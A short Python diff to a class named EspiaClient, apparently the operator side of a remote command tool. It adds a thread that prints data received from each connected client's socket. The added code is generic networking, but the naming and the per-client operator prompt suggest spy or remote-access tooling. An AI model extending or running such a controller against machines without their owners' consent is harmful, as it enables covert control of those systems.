@@ -11,6 +11,7 @@ class EspiaClient(threading.Thread):
         self.server = server
 
     def run(self):
+        threading.Thread(name='Reciever', target=self.recieve).start()
         self.pause()
         while (self.paused == False and self.closed == False):
             input_text = input("%s:%s >> " % (self.client_info[0], self.client_info[1]))
@@ -29,6 +30,12 @@ class EspiaClient(threading.Thread):
 
         print("[*] %s:%s got disconnected" % (self.client_info[0], self.client_info[1]))
         return
+    
+    def recieve(self):
+        try:
+            print(self.connection.recv(1024))
+        except ConnectionResetError:
+            self.close()
 
     def close(self):
         self.closed = True
